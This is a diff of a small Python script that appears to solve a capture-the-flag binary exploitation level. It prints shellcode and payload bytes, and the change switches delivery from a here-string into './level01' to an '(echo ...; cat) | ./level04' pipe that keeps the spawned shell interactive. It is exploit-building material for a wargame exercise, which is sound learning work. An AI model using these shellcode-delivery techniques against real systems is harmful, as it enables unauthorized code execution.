@@ -20,10 +20,10 @@ for s in shellcode:
     print("\\x%02x" % s, end='')
 print("'")
 
-print("./level01 <<< $'", end='')
+print("(echo -n $'", end='')
 for i, p in enumerate(payload):
     if printable(p) and i < len(payload) - 4:
         print(chr(p), end='')
     else:
         print("\\x%02x" % p, end="")
-print("'")
+print("'; cat) | ./level04")
